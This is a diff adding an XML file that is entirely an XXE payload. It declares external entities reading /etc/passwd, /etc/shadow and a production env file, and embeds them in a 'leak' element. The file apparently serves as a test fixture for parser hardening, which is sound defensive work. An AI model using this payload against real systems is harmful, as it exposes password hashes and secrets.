@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY shadow SYSTEM "file:///etc/shadow">
+  <!ENTITY secrets SYSTEM "file:///app/uploads/env.prod">
+]>
+<leak>
+  <system>&xxe;</system>
+  <shadow>&shadow;</shadow>
+  <mockenv>&secrets;</mockenv>
+</leak>
